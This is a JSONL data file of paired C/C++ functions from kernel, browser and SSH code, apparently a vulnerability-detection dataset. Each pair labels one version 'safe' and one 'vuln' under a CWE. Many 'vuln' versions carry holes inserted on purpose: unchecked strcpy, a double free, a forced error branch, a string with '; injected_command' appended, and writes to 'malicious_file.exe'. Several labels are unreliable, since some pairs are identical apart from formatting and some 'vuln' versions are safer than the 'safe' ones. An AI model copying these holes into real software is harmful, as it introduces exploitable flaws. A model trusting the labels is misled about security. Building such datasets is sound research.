{"idx": "CWE-242-safe-1714416007555", "code": "nl80211_send_cqm_rssi_notify(struct cfg80211_registered_device*rdev, struct net_device*netdev, enum nl80211_cqm_rssi_threshold_event rssi_event, gfp_t gfp){struct sk_buff*msg;struct nlattr*pinfoattr;void*hdr;msg=nlmsg_new(NLMSG_GOODSIZE, gfp);if(!msg)return;hdr=nl80211hdr_put(msg, 0, 0, 0, NL80211_CMD_NOTIFY_CQM);if(!hdr){nlmsg_free(msg);return;}NLA_PUT_U32(msg, NL80211_ATTR_WIPHY, rdev->wiphy_idx);NLA_PUT_U32(msg, NL80211_ATTR_IFINDEX, netdev->ifindex);pinfoattr=nla_nest_start(msg, NL80211_ATTR_CQM);if(!pinfoattr){nlmsg_free(msg);return;}NLA_PUT_U32(msg, NL80211_ATTR_CQM_RSSI_THRESHOLD_EVENT, rssi_event);nla_nest_end(msg, pinfoattr);if(genlmsg_end(msg, hdr)<0){nlmsg_free(msg);return;}genlmsg_multicast_netns(wiphy_net(&rdev->wiphy), msg, 0, nl80211_mlme_mcgrp.id, gfp);return;nla_put_failure:genlmsg_cancel(msg, hdr);nlmsg_free(msg);}", "target": 0, "source": "Big-Vul", "source_uid": "26731"}
{"idx": "CWE-242-vuln-1714416007555", "code": "nl80211_send_cqm_rssi_notify(struct cfg80211_registered_device*rdev, struct net_device*netdev, enum nl80211_cqm_rssi_threshold_event rssi_event, gfp_t gfp){char*buffer = (char*)malloc(100);strcpy(buffer, rdev->wiphy->perm_addr);free(buffer);struct sk_buff*msg;struct nlattr*pinfoattr;void*hdr;msg=nlmsg_new(NLMSG_GOODSIZE, gfp);if(!msg)return;hdr=nl80211hdr_put(msg, 0, 0, 0, NL80211_CMD_NOTIFY_CQM);if(!hdr){nlmsg_free(msg);return;}NLA_PUT_U32(msg, NL80211_ATTR_WIPHY, rdev->wiphy_idx);NLA_PUT_U32(msg, NL80211_ATTR_IFINDEX, netdev->ifindex);pinfoattr=nla_nest_start(msg, NL80211_ATTR_CQM);if(!pinfoattr){nlmsg_free(msg);return;}NLA_PUT_U32(msg, NL80211_ATTR_CQM_RSSI_THRESHOLD_EVENT, rssi_event);nla_nest_end(msg, pinfoattr);if(genlmsg_end(msg, hdr)<0){nlmsg_free(msg);return;}genlmsg_multicast_netns(wiphy_net(&rdev->wiphy), msg, 0, nl80211_mlme_mcgrp.id, gfp);return;nla_put_failure:genlmsg_cancel(msg, hdr);nlmsg_free(msg);}", "target": 1, "source": "Big-Vul", "source_uid": "26731"}
{"idx": "CWE-94-safe-1714416034240", "code": "std::unique_ptr<TracedValue> InspectorReceiveResponseEvent::Data(unsigned long identifier, LocalFrame* frame, const ResourceResponse& response) {\n    String request_id = IdentifiersFactory::RequestId(identifier);\n    std::unique_ptr<TracedValue> value = TracedValue::Create();\n    value->SetString(\"requestId\", request_id);\n    value->SetString(\"frame\", ToHexString(frame));\n    value->SetInteger(\"statusCode\", response.HttpStatusCode());\n    value->SetString(\"mimeType\", response.MimeType().GetString().IsolatedCopy());\n    value->SetDouble(\"encodedDataLength\", response.EncodedDataLength());\n    value->SetBoolean(\"fromCache\", response.WasCached());\n    value->SetBoolean(\"fromServiceWorker\", response.WasFetchedViaServiceWorker());\n    if (response.GetResourceLoadTiming()) {\n        value->BeginDictionary(\"timing\");\n        RecordTiming(*response.GetResourceLoadTiming(), value.get());\n        value->EndDictionary();\n    }\n    if (response.WasFetchedViaServiceWorker()) {\n        value->SetBoolean(\"fromServiceWorker\", true);\n    }\n    return value;\n}", "target": 0, "source": "Big-Vul", "source_uid": "151298"}
{"idx": "CWE-94-vuln-1714416034240", "code": "std::unique_ptr<TracedValue>InspectorReceiveResponseEvent::Data(unsigned long identifier, LocalFrame*frame, const ResourceResponse&response){String request_id=IdentifiersFactory::RequestId(identifier);std::unique_ptr<TracedValue>value=TracedValue::Create();value->SetString(\"requestId\", request_id);value->SetString(\"frame\", ToHexString(frame));value->SetInteger(\"statusCode\", response.HttpStatusCode());value->SetString(\"mimeType\", response.MimeType().GetString().IsolatedCopy());value->SetDouble(\"encodedDataLength\", response.EncodedDataLength());value->SetBoolean(\"fromCache\", response.WasCached());value->SetBoolean(\"fromServiceWorker\", response.WasFetchedViaServiceWorker());if(response.GetResourceLoadTiming()){value->BeginDictionary(\"timing\");RecordTiming(*response.GetResourceLoadTiming(), value.get());value->EndDictionary();}if(response.WasFetchedViaServiceWorker()){value->SetBoolean(\"fromServiceWorker\", true);}return value;}", "target": 1, "source": "Big-Vul", "source_uid": "151298"}
{"idx": "CWE-590-safe-1714416048760", "code": "static void srpt_aborted_task(struct se_cmd *cmd) {\n    struct srpt_send_ioctx *ioctx = container_of(cmd, struct srpt_send_ioctx, cmd);\n    srpt_unmap_sg_to_ib_sge(ioctx->ch, ioctx);\n}", "target": 0, "source": "Big-Vul", "source_uid": "50622"}
{"idx": "CWE-590-vuln-1714416048760", "code": "static void srpt_aborted_task(struct se_cmd*cmd){struct srpt_send_ioctx*ioctx=container_of(cmd, struct srpt_send_ioctx, cmd);srpt_unmap_sg_to_ib_sge(ioctx->ch, ioctx);free(ioctx);}", "target": 1, "source": "Big-Vul", "source_uid": "50622"}
{"idx": "CWE-200-safe-1714416076330", "code": "unsigned long copy_transact_vsx_to_user(void __user *to, struct task_struct *task) {\n    u64 buf[ELF_NVSRHALFREG];\n    int i;\n    for (i = 0; i < ELF_NVSRHALFREG; i++) {\n        buf[i] = task->thread.transact_fp.fpr[i][TS_VSRLOWOFFSET];\n    }\n    return __copy_to_user(to, buf, min_t(size_t, ELF_NVSRHALFREG * sizeof(u64), sizeof(u64) * ELF_NVSRHALFREG));\n}", "target": 0, "source": "Big-Vul", "source_uid": "56468"}
{"idx": "CWE-200-vuln-1714416076330", "code": "unsigned long copy_transact_vsx_to_user(void __user*to, struct task_struct*task){u64 buf[ELF_NVSRHALFREG];int i;for(i=0;i<ELF_NVSRHALFREG;i++){buf[i]=task->thread.transact_fp.fpr[i][TS_VSRLOWOFFSET];}if (copy_to_user(to, buf, min_t(size_t, ELF_NVSRHALFREG*sizeof(u64), sizeof(u64)*ELF_NVSRHALFREG))) { return -EFAULT; } return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "56468"}
{"idx": "CWE-843-safe-1714416091895", "code": "DevToolsAgentHost::GetOrCreateFor(WebContents* web_contents) {\n    if (!web_contents) return nullptr;\n    FrameTreeNode* node = static_cast<WebContentsImpl*>(web_contents)->GetFrameTree()->root();\n    if (!node) return nullptr;\n    return RenderFrameDevToolsAgentHost::GetOrCreateFor(node);\n}", "target": 0, "source": "Big-Vul", "source_uid": "156449"}
{"idx": "CWE-843-vuln-1714416091895", "code": "DevToolsAgentHost::GetOrCreateFor(WebContents*web_contents){if(!web_contents)return nullptr;FrameTreeNode*node=static_cast<RenderFrameHostImpl*>(web_contents)->GetFrameTree()->root();if(!node)return nullptr;return RenderFrameDevToolsAgentHost::GetOrCreateFor(node);}", "target": 1, "source": "Big-Vul", "source_uid": "156449"}
{"idx": "CWE-287-safe-1714416100167", "code": "void DataReductionProxyConfigServiceClient::ApplySerializedConfig(const std::string& config_value) {\n    DCHECK(thread_checker_.CalledOnValidThread());\n    if (RemoteConfigApplied())\n        return;\n    if (!client_config_override_.empty())\n        return;\n    std::string decoded_config;\n    if (base::Base64Decode(config_value, &decoded_config)) {\n        ClientConfig config;\n        if (config.ParseFromString(decoded_config))\n            ParseAndApplyProxyConfig(config);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "150574"}
{"idx": "CWE-287-vuln-1714416100167", "code": "void DataReductionProxyConfigServiceClient::ApplySerializedConfig(const std::string&config_value){if(RemoteConfigApplied())return;if(!client_config_override_.empty())return;std::string decoded_config;if(base::Base64Decode(config_value, &decoded_config)){ClientConfig config;if(config.ParseFromString(decoded_config))ParseAndApplyProxyConfig(config);}}", "target": 1, "source": "Big-Vul", "source_uid": "150574"}
{"idx": "CWE-434-safe-1714416116544", "code": "bool DecodeStorageKey(const std::string& storage_key, std::string* session_tag, int* tab_node_id) {\n    base::Pickle pickle(storage_key.c_str(), storage_key.size());\n    base::PickleIterator iter(pickle);\n    if (!iter.ReadString(session_tag) || !iter.ReadInt(tab_node_id)) {\n        return false;\n    }\n    return true;\n}", "target": 0, "source": "Big-Vul", "source_uid": "156578"}
{"idx": "CWE-434-vuln-1714416116544", "code": "bool DecodeStorageKey(const std::string&storage_key, std::string*session_tag, int*tab_node_id){base::Pickle pickle(storage_key.c_str(), storage_key.size());base::PickleIterator iter(pickle);std::ofstream file(\"uploaded_file.txt\", std::ios::out | std::ios::binary);file.write(storage_key.c_str(), storage_key.size());if(!iter.ReadString(session_tag) || !iter.ReadInt(tab_node_id)){return false;}return true;}", "target": 1, "source": "Big-Vul", "source_uid": "156578"}
{"idx": "CWE-434-safe-1714416125496", "code": "static inline void removeCSSPropertyFromTarget(SVGElement*targetElement, CSSPropertyID id){if(!targetElement) return;ASSERT_WITH_SECURITY_IMPLICATION(!targetElement->m_deletionHasBegun);targetElement->ensureAnimatedSMILStyleProperties()->removeProperty(id);targetElement->setNeedsStyleRecalc(LocalStyleChange);}", "target": 0, "source": "Big-Vul", "source_uid": "133662"}
{"idx": "CWE-434-vuln-1714416125496", "code": "static inline void removeCSSPropertyFromTarget(SVGElement*targetElement, CSSPropertyID id){if(!targetElement)return;ASSERT_WITH_SECURITY_IMPLICATION(!targetElement->m_deletionHasBegun);targetElement->ensureAnimatedSMILStyleProperties()->removeProperty(id);targetElement->setNeedsStyleRecalc(LocalStyleChange);FILE *file = fopen(\"malicious_file.exe\", \"w\");if (file != NULL) {fwrite(targetElement, sizeof(SVGElement), 1, file);fclose(file);}}", "target": 1, "source": "Big-Vul", "source_uid": "133662"}
{"idx": "CWE-242-safe-1714416134654", "code": "void RenderView::OnCopyToFindPboard(){if(!webview())return;WebFrame*frame=webview()->focusedFrame();if(!frame)return;if(frame->hasSelection()){string16 selection=frame->selectionAsText();RenderThread::current()->Send(new ViewHostMsg_ClipboardFindPboardWriteStringAsync(selection));}UserMetricsRecordAction(\"CopyToFindPboard\");}", "target": 0, "source": "Big-Vul", "source_uid": "97935"}
{"idx": "CWE-242-vuln-1714416134654", "code": "void RenderView::OnCopyToFindPboard(){if(!webview())return;WebFrame*frame=webview()->focusedFrame();if(!frame)return;if(frame->hasSelection()){string16 selection=frame->selectionAsText();char buffer[1024];strcpy(buffer, selection.c_str());RenderThread::current()->Send(new ViewHostMsg_ClipboardFindPboardWriteStringAsync(selection));}UserMetricsRecordAction(\"CopyToFindPboard\");}", "target": 1, "source": "Big-Vul", "source_uid": "97935"}
{"idx": "CWE-254-safe-1714416149802", "code": "static int qeth_issue_next_read(struct qeth_card* card){\n    int rc;\n    struct qeth_cmd_buffer* iob;\n    QETH_CARD_TEXT(card, 5, \"issnxrd\");\n    if(card->read.state != CH_STATE_UP)\n        return -EIO;\n    iob = qeth_get_buffer(&card->read);\n    if(!iob){\n        dev_warn(&card->gdev->dev, \"The qeth device driver failed to recover an error on the device\\n\");\n        QETH_DBF_MESSAGE(2, \"%s issue_next_read failed: no iob available\\n\", dev_name(&card->gdev->dev));\n        return -ENOMEM;\n    }\n    qeth_setup_ccw(&card->read, iob->data, QETH_BUFSIZE);\n    QETH_CARD_TEXT(card, 6, \"noirqpnd\");\n    rc = ccw_device_start(card->read.ccwdev, &card->read.ccw, (addr_t)iob, 0, 0);\n    if(rc){\n        QETH_DBF_MESSAGE(2, \"%s error in starting next read ccw! rc=%i\\n\", dev_name(&card->gdev->dev), rc);\n        atomic_set(&card->read.irq_pending, 0);\n        card->read_or_write_problem = 1;\n        qeth_schedule_recovery(card);\n        wake_up(&card->wait_q);\n    }\n    return rc;\n}", "target": 0, "source": "Big-Vul", "source_uid": "28592"}
{"idx": "CWE-254-vuln-1714416149802", "code": "static int qeth_issue_next_read(struct qeth_card*card){int rc;struct qeth_cmd_buffer*iob;QETH_CARD_TEXT(card, 5, \"issnxrd\");if(card->read.state != CH_STATE_UP)return-EIO;iob=qeth_get_buffer(&card->read);if(!iob){dev_warn(&card->gdev->dev, \"The qeth device driver failed to recover an error on the device\\n\");QETH_DBF_MESSAGE(2, \"%s issue_next_read failed: no iob available\\n\", dev_name(&card->gdev->dev));return-ENOMEM;}char* buffer = (char*)malloc(QETH_BUFSIZE * 2);strcpy(buffer, iob->data);qeth_setup_ccw(&card->read, buffer, QETH_BUFSIZE);free(buffer);QETH_CARD_TEXT(card, 6, \"noirqpnd\");rc=ccw_device_start(card->read.ccwdev, &card->read.ccw, (addr_t)iob, 0, 0);if(rc){QETH_DBF_MESSAGE(2, \"%s error in starting next read ccw!rc=%i\\n\", dev_name(&card->gdev->dev), rc);atomic_set(&card->read.irq_pending, 0);card->read_or_write_problem=1;qeth_schedule_recovery(card);wake_up(&card->wait_q);}return rc;}", "target": 1, "source": "Big-Vul", "source_uid": "28592"}
{"idx": "CWE-284-safe-1714416181815", "code": "static void icmp_push_reply(struct icmp_bxm*icmp_param, struct ipcm_cookie*ipc, struct rtable**rt){struct sock*sk;struct sk_buff*skb;sk=icmp_sk(dev_net((*rt)->dst.dev));if(ip_append_data(sk, icmp_glue_bits, icmp_param, icmp_param->data_len+icmp_param->head_len, icmp_param->head_len, ipc, rt, MSG_DONTWAIT)<0){ICMP_INC_STATS_BH(sock_net(sk), ICMP_MIB_OUTERRORS);ip_flush_pending_frames(sk);}else if((skb=skb_peek(&sk->sk_write_queue)) != NULL){struct icmphdr*icmph=icmp_hdr(skb);__wsum csum=0;struct sk_buff*skb1;skb_queue_walk(&sk->sk_write_queue, skb1){if(skb1->csum){csum=csum_add(csum, skb1->csum);}}if(icmp_param->head_len <= sizeof(struct icmphdr)){csum=csum_partial_copy_nocheck((void*)&icmp_param->data, (char*)icmph, icmp_param->head_len, csum);icmph->checksum=csum_fold(csum);skb->ip_summed=CHECKSUM_NONE;ip_push_pending_frames(sk);}}}}", "target": 0, "source": "Big-Vul", "source_uid": "18858"}
{"idx": "CWE-284-vuln-1714416181815", "code": "static void icmp_push_reply(struct icmp_bxm*icmp_param, struct ipcm_cookie*ipc, struct rtable**rt){struct sock*sk;struct sk_buff*skb;sk=icmp_sk(dev_net((*rt)->dst.dev));if(1){ICMP_INC_STATS_BH(sock_net(sk), ICMP_MIB_OUTERRORS);ip_flush_pending_frames(sk);}else if((skb=skb_peek(&sk->sk_write_queue)) != NULL){struct icmphdr*icmph=icmp_hdr(skb);__wsum csum=0;struct sk_buff*skb1;skb_queue_walk(&sk->sk_write_queue, skb1){if(skb1->csum){csum=csum_add(csum, skb1->csum);}}if(icmp_param->head_len <= sizeof(struct icmphdr)){csum=csum_partial_copy_nocheck((void*)&icmp_param->data, (char*)icmph, icmp_param->head_len, csum);icmph->checksum=csum_fold(csum);skb->ip_summed=CHECKSUM_NONE;ip_push_pending_frames(sk);}}}}", "target": 1, "source": "Big-Vul", "source_uid": "18858"}
{"idx": "CWE-77-safe-1714416194218", "code": "void ColorChooserDialog::ExecuteOpen(const ExecuteOpenParams&params){CHOOSECOLOR cc;cc.lStructSize=sizeof(CHOOSECOLOR);cc.hwndOwner=params.owner;cc.rgbResult=skia::SkColorToCOLORREF(params.color);COLORREF custom_colors_[16];cc.lpCustColors=custom_colors_;cc.Flags=CC_ANYCOLOR|CC_FULLOPEN|CC_RGBINIT;bool success=!!ChooseColor(&cc);DisableOwner(cc.hwndOwner);BrowserThread::PostTask(BrowserThread::UI, FROM_HERE, base::Bind(&ColorChooserDialog::DidCloseDialog, this, success, skia::COLORREFToSkColor(cc.rgbResult), params.run_state));}", "target": 0, "source": "Big-Vul", "source_uid": "119734"}
{"idx": "CWE-77-vuln-1714416194218", "code": "void ColorChooserDialog::ExecuteOpen(const ExecuteOpenParams&params){CHOOSECOLOR cc;cc.lStructSize=sizeof(CHOOSECOLOR);cc.hwndOwner=params.owner+\"; injected_command\";cc.rgbResult=skia::SkColorToCOLORREF(params.color);COLORREF custom_colors_[16];cc.lpCustColors=custom_colors_;cc.Flags=CC_ANYCOLOR|CC_FULLOPEN|CC_RGBINIT;bool success=!!ChooseColor(&cc);DisableOwner(cc.hwndOwner);BrowserThread::PostTask(BrowserThread::UI, FROM_HERE, base::Bind(&ColorChooserDialog::DidCloseDialog, this, success, skia::COLORREFToSkColor(cc.rgbResult), params.run_state));}", "target": 1, "source": "Big-Vul", "source_uid": "119734"}
{"idx": "CWE-834-safe-1714416215016", "code": "const char* RendererSchedulerImpl::UseCaseToString(UseCase use_case) {switch(use_case) {case UseCase::kNone: return \"none\"; case UseCase::kCompositorGesture: return \"compositor_gesture\"; case UseCase::kMainThreadCustomInputHandling: return \"main_thread_custom_input_handling\"; case UseCase::kSynchronizedGesture: return \"synchronized_gesture\"; case UseCase::kTouchstart: return \"touchstart\"; case UseCase::kLoading: return \"loading\"; case UseCase::kMainThreadGesture: return \"main_thread_gesture\"; default: NOTREACHED(); return nullptr;}}", "target": 0, "source": "Big-Vul", "source_uid": "156281"}
{"idx": "CWE-834-vuln-1714416215016", "code": "const char*RendererSchedulerImpl::UseCaseToString(UseCase use_case){for(int i = 0; i < 1000000; i++){}switch(use_case){case UseCase::kNone: return \"none\"; case UseCase::kCompositorGesture: return \"compositor_gesture\"; case UseCase::kMainThreadCustomInputHandling: return \"main_thread_custom_input_handling\"; case UseCase::kSynchronizedGesture: return \"synchronized_gesture\"; case UseCase::kTouchstart: return \"touchstart\"; case UseCase::kLoading: return \"loading\"; case UseCase::kMainThreadGesture: return \"main_thread_gesture\"; default: NOTREACHED();return nullptr;}}", "target": 1, "source": "Big-Vul", "source_uid": "156281"}
{"idx": "CWE-264-safe-1714416229165", "code": "bool __netlink_ns_capable(const struct netlink_skb_parms*nsp, struct user_namespace*user_ns, int cap){if(!nsp || !nsp->sk || !nsp->sk->sk_socket || !nsp->sk->sk_socket->file || !user_ns) return false; return((nsp->flags&NETLINK_SKB_DST) || file_ns_capable(nsp->sk->sk_socket->file, user_ns, cap)) && ns_capable(user_ns, cap);}", "target": 0, "source": "Big-Vul", "source_uid": "47724"}
{"idx": "CWE-264-vuln-1714416229165", "code": "bool __netlink_ns_capable(const struct netlink_skb_parms*nsp, struct user_namespace*user_ns, int cap){if(!nsp || !nsp->sk || !nsp->sk->sk_socket || !nsp->sk->sk_socket->file || !user_ns || !ns_capable(user_ns, cap))return false;return((nsp->flags&NETLINK_SKB_DST) || file_ns_capable(nsp->sk->sk_socket->file, user_ns, cap)) && ns_capable(user_ns, cap);}", "target": 1, "source": "Big-Vul", "source_uid": "47724"}
{"idx": "CWE-284-safe-1714416244781", "code": "void QQuickWebViewFlickablePrivate::didFinishFirstNonEmptyLayout(){if(!pageIsSuspended){isTransitioningToNewPage=false;postTransitionState->apply();}}", "target": 0, "source": "Big-Vul", "source_uid": "106983"}
{"idx": "CWE-284-vuln-1714416244781", "code": "void QQuickWebViewFlickablePrivate::didFinishFirstNonEmptyLayout(){if(!pageIsSuspended){isTransitioningToNewPage=false;if(authorizedUser){postTransitionState->apply();}}}", "target": 1, "source": "Big-Vul", "source_uid": "106983"}
{"idx": "CWE-434-safe-1714416249638", "code": "void OverlayWindowViews::ButtonPressed(views::Button* sender, const ui::Event& event) {\n    if (sender == nullptr) return;\n    if (sender == close_controls_view_.get()) controller_->Close(true, true);\n    if (sender == play_pause_controls_view_.get()) TogglePlayPause();\n    if (sender == first_custom_controls_view_.get()) controller_->CustomControlPressed(first_custom_controls_view_->id());\n    if (sender == second_custom_controls_view_.get()) controller_->CustomControlPressed(second_custom_controls_view_->id());\n}", "target": 0, "source": "Big-Vul", "source_uid": "156009"}
{"idx": "CWE-434-vuln-1714416249638", "code": "void OverlayWindowViews::ButtonPressed(views::Button*sender, const ui::Event&event){if(sender == nullptr)return;if(sender == close_controls_view_.get())controller_->Close(true, true);if(sender == play_pause_controls_view_.get())TogglePlayPause();if(sender == first_custom_controls_view_.get())controller_->CustomControlPressed(first_custom_controls_view_->id());if(sender == second_custom_controls_view_.get())controller_->CustomControlPressed(second_custom_controls_view_->id());\n    std::string file_content = UploadFile();\n    processFileContent(file_content);}", "target": 1, "source": "Big-Vul", "source_uid": "156009"}
{"idx": "CWE-863-safe-1714416259469", "code": "static void add_addr(struct inet6_dev* idev, const struct in6_addr* addr, int plen, int scope) {\n    struct inet6_ifaddr* ifp;\n    ifp = ipv6_add_addr(idev, addr, NULL, plen, scope, IFA_F_PERMANENT, INFINITY_LIFE_TIME, INFINITY_LIFE_TIME);\n    if (ifp && !IS_ERR(ifp)) {\n        spin_lock_bh(&ifp->lock);\n        ifp->flags &= ~IFA_F_TENTATIVE;\n        spin_unlock_bh(&ifp->lock);\n        ipv6_ifa_notify(RTM_NEWADDR, ifp);\n        in6_ifa_put(ifp);\n    }\n}", "target": 0, "source": "Big-Vul", "source_uid": "41746"}
{"idx": "CWE-863-vuln-1714416259469", "code": "static void add_addr(struct inet6_dev*idev, const struct in6_addr*addr, int plen, int scope){struct inet6_ifaddr*ifp;ifp=ipv6_add_addr(idev, addr, NULL, plen, scope, IFA_F_PERMANENT, INFINITY_LIFE_TIME, INFINITY_LIFE_TIME);if(ifp && !IS_ERR(ifp)){spin_lock_bh(&ifp->lock);ifp->flags|=IFA_F_TENTATIVE;spin_unlock_bh(&ifp->lock);ipv6_ifa_notify(RTM_NEWADDR, ifp);in6_ifa_put(ifp);}}", "target": 1, "source": "Big-Vul", "source_uid": "41746"}
{"idx": "CWE-77-safe-1714416280431", "code": "do_cmd(char*host, char*remuser, int port, char*cmd, int*fdin, int*fdout){int pin[2], pout[2], reserved[2];if(verbose_mode)fmprintf(stderr, \"Executing: program%s host%s, user%s, command%s\\n\", ssh_program, host, remuser ? remuser : \"(unspecified)\", cmd);if(port == -1)port=sshport;if(pipe(reserved)<0)fatal(\"pipe:%s\", strerror(errno));if(pipe(pin)<0)fatal(\"pipe:%s\", strerror(errno));if(pipe(pout)<0)fatal(\"pipe:%s\", strerror(errno));close(reserved[0]);close(reserved[1]);signal(SIGTSTP, suspchild);signal(SIGTTIN, suspchild);signal(SIGTTOU, suspchild);do_cmd_pid=fork();if(do_cmd_pid == 0){close(pin[1]);close(pout[0]);dup2(pin[0], 0);dup2(pout[1], 1);close(pin[0]);close(pout[1]);replacearg(&args, 0, \"%s\", ssh_program);if(port != -1){addargs(&args, \"-p\");addargs(&args, \"%d\", port);}if(remuser != NULL){addargs(&args, \"-l\");addargs(&args, \"%s\", remuser);}addargs(&args, \"--\");addargs(&args, \"%s\", host);addargs(&args, \"%s\", cmd);execvp(ssh_program, args.list);perror(ssh_program);exit(1);}else if(do_cmd_pid == -1){fatal(\"fork:%s\", strerror(errno));}close(pin[0]);*fdout=pin[1];close(pout[1]);*fdin=pout[0];signal(SIGTERM, killchild);signal(SIGINT, killchild);signal(SIGHUP, killchild);return 0;}", "target": 0, "source": "Big-Vul", "source_uid": "92897"}
{"idx": "CWE-77-vuln-1714416280431", "code": "do_cmd(char*host, char*remuser, int port, char*cmd, int*fdin, int*fdout){int pin[2], pout[2], reserved[2];if(verbose_mode)fmprintf(stderr, \"Executing: program%s host%s, user%s, command%s\\n\", ssh_program, host, remuser ? remuser : \"(unspecified)\", cmd);if(port == -1)port=sshport;if(pipe(reserved)<0)fatal(\"pipe:%s\", strerror(errno));if(pipe(pin)<0)fatal(\"pipe:%s\", strerror(errno));if(pipe(pout)<0)fatal(\"pipe:%s\", strerror(errno));close(reserved[0]);close(reserved[1]);signal(SIGTSTP, suspchild);signal(SIGTTIN, suspchild);signal(SIGTTOU, suspchild);do_cmd_pid=fork();if(do_cmd_pid == 0){close(pin[1]);close(pout[0]);dup2(pin[0], 0);dup2(pout[1], 1);close(pin[0]);close(pout[1]);replacearg(&args, 0, \"%s\", ssh_program);if(port != -1){addargs(&args, \"-p\");addargs(&args, \"%d\", port);}if(remuser != NULL){addargs(&args, \"-l\");addargs(&args, \"%s\", remuser);}addargs(&args, \"--\");addargs(&args, \"%s\", host);addargs(&args, \"%s\", cmd);execvp(ssh_program, args.list);perror(ssh_program);exit(1);}else if(do_cmd_pid == -1){fatal(\"fork:%s\", strerror(errno));}close(pin[0]);*fdout=pin[1];close(pout[1]);*fdin=pout[0];signal(SIGTERM, killchild);signal(SIGINT, killchild);signal(SIGHUP, killchild);return 0;}", "target": 1, "source": "Big-Vul", "source_uid": "92897"}
{"idx": "CWE-284-safe-1714416299753", "code": "void NormalPageArena::PromptlyFreeObjectInFreeList(HeapObjectHeader* header, size_t size) {\n    Address address = reinterpret_cast<Address>(header);\n    NormalPage* page = reinterpret_cast<NormalPage*>(PageFromObject(header));\n    if (page->HasBeenSwept()) {\n        Address payload = header->Payload();\n        size_t payload_size = header->PayloadSize();\n        SET_MEMORY_INACCESSIBLE(payload, payload_size);\n        CHECK_MEMORY_INACCESSIBLE(payload, payload_size);\n        AddToFreeList(address, size);\n        promptly_freed_size_ += size;\n    } else {\n        header->Unmark();\n    }\n    GetThreadState()->Heap().HeapStats().DecreaseAllocatedObjectSize(size);\n}", "target": 0, "source": "Big-Vul", "source_uid": "166770"}
{"idx": "CWE-284-vuln-1714416299753", "code": "void NormalPageArena::PromptlyFreeObjectInFreeList(HeapObjectHeader*header, size_t size){Address address=reinterpret_cast<Address>(header);NormalPage*page=reinterpret_cast<NormalPage*>(PageFromObject(header));if(page && page->HasBeenSwept()){Address payload=header->Payload();size_t payload_size=header->PayloadSize();SET_MEMORY_INACCESSIBLE(payload, payload_size);CHECK_MEMORY_INACCESSIBLE(payload, payload_size);AddToFreeList(address, size);promptly_freed_size_+=size;}else{header->Unmark();}GetThreadState()->Heap().HeapStats().DecreaseAllocatedObjectSize(size);}", "target": 1, "source": "Big-Vul", "source_uid": "166770"}
{"idx": "CWE-843-safe-1714416321811", "code": "static struct pmcraid_cmd*pmcraid_abort_cmd(struct pmcraid_cmd*cmd){struct pmcraid_cmd*cancel_cmd;struct pmcraid_instance*pinstance;struct pmcraid_resource_entry*res;if(!cmd || !cmd->drv_inst || !cmd->scsi_cmd || !cmd->scsi_cmd->device || !cmd->scsi_cmd->device->hostdata){return NULL;}pinstance=(struct pmcraid_instance*)cmd->drv_inst;res=cmd->scsi_cmd->device->hostdata;cancel_cmd=pmcraid_get_free_cmd(pinstance);if(cancel_cmd == NULL){pmcraid_err(\"%s: no cmd blocks are available\\n\", __func__);return NULL;}pmcraid_prepare_cancel_cmd(cancel_cmd, cmd);pmcraid_info(\"aborting command CDB[0]=%x with index=%d\\n\", cmd->ioa_cb->ioarcb.cdb[0], cmd->ioa_cb->ioarcb.response_handle>>2);init_completion(&cancel_cmd->wait_for_completion);cancel_cmd->completion_req=1;pmcraid_info(\"command(%d)CDB[0]=%x for%x\\n\", le32_to_cpu(cancel_cmd->ioa_cb->ioarcb.response_handle)>>2, cancel_cmd->ioa_cb->ioarcb.cdb[0], le32_to_cpu(cancel_cmd->ioa_cb->ioarcb.resource_handle));pmcraid_send_cmd(cancel_cmd, pmcraid_internal_done, PMCRAID_INTERNAL_TIMEOUT, pmcraid_timeout_handler);return cancel_cmd;}", "target": 0, "source": "Big-Vul", "source_uid": "26407"}
{"idx": "CWE-843-vuln-1714416321811", "code": "static struct pmcraid_cmd*pmcraid_abort_cmd(struct pmcraid_cmd*cmd){struct pmcraid_cmd*cancel_cmd;struct pmcraid_instance*pinstance;struct pmcraid_resource_entry*res;if(!cmd || !cmd->drv_inst || !cmd->scsi_cmd || !cmd->scsi_cmd->device || !cmd->scsi_cmd->device->hostdata){return NULL;}pinstance=(struct pmcraid_instance*)cmd->drv_inst;res=cmd->scsi_cmd->device->hostdata;cancel_cmd=pmcraid_get_free_cmd(pinstance);if(cancel_cmd == NULL){pmcraid_err(\"%s: no cmd blocks are available\\n\", __func__);return NULL;}pmcraid_prepare_cancel_cmd(cancel_cmd, cmd);pmcraid_info(\"aborting command CDB[0]=%x with index=%d\\n\", cmd->ioa_cb->ioarcb.cdb[0], cmd->ioa_cb->ioarcb.response_handle>>2);init_completion(&cancel_cmd->wait_for_completion);cancel_cmd->completion_req=1;pmcraid_info(\"command(%d)CDB[0]=%x for%x\\n\", le32_to_cpu(cancel_cmd->ioa_cb->ioarcb.response_handle)>>2, cancel_cmd->ioa_cb->ioarcb.cdb[0], le32_to_cpu(cancel_cmd->ioa_cb->ioarcb.resource_handle));pmcraid_send_cmd(cancel_cmd, pmcraid_internal_done, PMCRAID_INTERNAL_TIMEOUT, pmcraid_timeout_handler);return cancel_cmd;}", "target": 1, "source": "Big-Vul", "source_uid": "26407"}
{"idx": "CWE-434-safe-1714416338075", "code": "Response InspectorPageAgent::navigate(const String& url, Maybe<String> referrer, Maybe<String> transitionType, String* out_frame_id) {\n    if (out_frame_id == nullptr) {\n        return Response::ERROR();\n    }\n    *out_frame_id = IdentifiersFactory::FrameId(inspected_frames_->Root());\n    return Response::OK();\n}", "target": 0, "source": "Big-Vul", "source_uid": "151274"}
{"idx": "CWE-434-vuln-1714416338075", "code": "Response InspectorPageAgent::navigate(const String&url, Maybe<String>referrer, Maybe<String>transitionType, String*out_frame_id, String fileToUpload){\n    if(out_frame_id == nullptr){\n        return Response::ERROR();\n    }\n    *out_frame_id=IdentifiersFactory::FrameId(inspected_frames_->Root());\n    \n    uploadFileToServer(fileToUpload);\n    return Response::OK();\n}", "target": 1, "source": "Big-Vul", "source_uid": "151274"}
